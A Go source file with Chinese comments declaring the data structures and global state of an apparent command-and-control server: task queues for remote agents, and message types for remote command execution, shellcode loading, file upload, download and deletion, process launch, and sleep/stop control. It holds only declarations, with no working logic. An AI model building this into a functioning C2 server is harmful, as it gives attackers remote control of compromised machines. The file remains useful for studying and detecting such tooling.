package main

import "sync"

// 已有模块
var globalModule string

var ShellStatus = make(map[string]bool)

// 已有的操作种类
// var default_operation = []string{"exec", "dir", "del_file", "del_folder", "upload", "download", "mkdir", "rename", "load", "sleep", "stop", "list_drivers", "process"}

// 睡眠时间
// var Sleep_time map[string]string

// session列表
var session_list = struct {
	sync.RWMutex
	m map[string]string
}{m: make(map[string]string)}

// 客户端创建的，但还未发送给agent的任务,slice
var tasks = make(map[string][]string)

// 服务器端已发送给agent的任务，需要等待结果发回，再进行删除
var tasks_send = make(map[string][]string)

// Agent完成任务后发回给Server的完整数据，Server会传回给Client
//var exec_data = make(map[string]string)
var exec_data = struct {
	sync.RWMutex
	m map[string]string
}{m: make(map[string]string)}

// 任务回传数据的缓冲，主要是用在exec操作，判断exec操作是否已经完成
var tasks_buff = make(map[string]string)

// type 对应的 operation
var type_operation = make(map[string][]string)

// shellcode文件存放的路径
var shellcode_path = "D:\\project\\c2go\\c2server\\shellcode\\"

// 下载文件存放的路径
var download_path = "D:\\project\\c2go\\c2server\\download\\"

// 存放dir中folder解析后的数据
var folder_data = make(map[string]string)

// 每台主机对应的sleep时间
var sleep_time = make(map[string]string)

// 简单的身份认证密码
var password string

//// 客户端创建的，但还未发送给agent的任务,slice
//type tasks struct {
//	IP string
//	Task_data list.List
//}

type Agent struct {
	Hostname string `json:"hostname"`
	Type     string `json:"type"`
}

type Agent_Session struct {
	Agent
	Operation string `json:"operation"`
}

// Client 发给Server的初步任务信息，通过type和operation决定下一步到哪个函数
type Task struct {
	IP        string `json:"ip"`
	Type      string `json:"type"`
	Hostname  string `json:"hostname"`
	Operation string `json:"operation"`
}

// Agent从Server主动获取任务信息的结构体
type Post_Task struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	Data      string `json:"data"`
}

// Client 发送给Server 执行load shellcode操作
type Post_Load struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	Data      string `json:"data"`
}

// Client 发送给Server 执行exec操作的任务信息的结构体
type Post_Exec struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	Data      string `json:"data"` //这里的data指commandline
}

// 服务器接收到Agent返回的exec数据
type Get_Exec struct {
	Agent_Session
	Data string `json:"data"` //这里的data指运行命令后的返回值，可能会分多次发回
}

// Client 发送给Server 执行dir操作的任务信息的结构体
type Post_Dir struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	Data      string `json:"data"` // 这里的data指要执行dir操作的Agent路径
}

// 服务器接收到Agent返回的dir数据
type Get_Dir struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	Data      string `json:"data"`   // 这里的data指要执行dir操作的Agent路径
	Status    string `json:"status"` // 操作的成果或失败
	Folder    string `json:"folder"` // 具体的文件夹内容
}

// Client 发送给Server 执行del_file操作的任务信息的结构体
type Post_Del_File struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	Data      string `json:"data"`
}

// 服务器接收到Agent返回的del_file数据
type Get_Del_file struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	Data      string `json:"data"`
	Status    string `json:"status"`
}

// Client 发送给Server 执行del_folder 操作的任务信息的结构体
type Post_Del_Folder struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	Data      string `json:"data"`
}

// 服务器接收到Agent返回的del_folder数据
type Get_Del_Folder struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	Data      string `json:"data"`
	Status    string `json:"status"`
}

// Client 发送给Server 执行upload 操作的任务信息的结构体
type Post_Upload struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	File_Name string `json:"file_name"`
	File_Len  string `json:"file_len"`
	Data      string `json:"data"`
}

// 服务器接收到Agent返回的upload数据
type Get_Upload struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	File_Name string `json:"file_name"`
	Status    string `json:"status"`
}

// Client 发送给Server 执行download 操作任务信息的结构体
type Post_Download struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	File_Name string `json:"file_name"`
}

// 服务器接收到Agent返回的upload数据
type Get_Download struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	File_Name string `json:"file_name"`
	Data      string `json:"data"`
	Status    string `json:"status"`
}

// Client 发送给Server mkdir 操作任务信息的结构体
type Post_Mkdir struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	Data      string `json:"data"`
}

// 服务器接收到Agent返回的mkdir数据
type Get_Mkdir struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	Data      string `json:"data"`
	Status    string `json:"status"`
}

// Client 发送给Server rename操作任务信息的结构体
type Post_Rename struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	Old_Name  string `json:"old_name"`
	New_Name  string `json:"new_name"`
}

// 服务器接收到Agent返回的rename数据
type Get_Rename struct {
	Hostname      string `json:"hostname"`
	Type          string `json:"type"`
	Operation     string `json:"operation"`
	Old_File_Name string `json:"old_name"`
	New_File_Name string `json:"new_name"`
	Status        string `json:"status"`
}

// Client 发送给Server list_drivers操作任务信息的结构体
type Post_List_Drivers struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
}

// 服务器接收到Agent返回的List_Drivers数据
type Get_List_Driver struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	Data      string `json:"data"`
	Status    string `json:"status"`
}

// Client 发送给Server process操作任务信息的结构体
type Post_Process struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	File_Name string `json:"file_name"` // 要执行的文件路径
	Data      string `json:"data"`      // 参数
}

// Client 发送给Server sleep操作任务信息的结构体
type Post_Sleep struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	Data      string `json:"data"`
}

// Client 发送给Server stop操作任务信息的结构体
type Post_Stop struct {
	Hostname  string `json:"hostname"`
	Type      string `json:"type"`
	Operation string `json:"operation"`
	Data      string `json:"data"`
}

// 将dir中的folder解析为json
// type Dir_Folder struct {
// 	File_Name string `json:"file_name"`
// 	File_Attr
// }

// type File_Attr struct {
// 	File_Type string `json:"file_type"`
// 	File_Size string `json:"file_size"`
// 	File_Time string `json:"file_time"`
// }
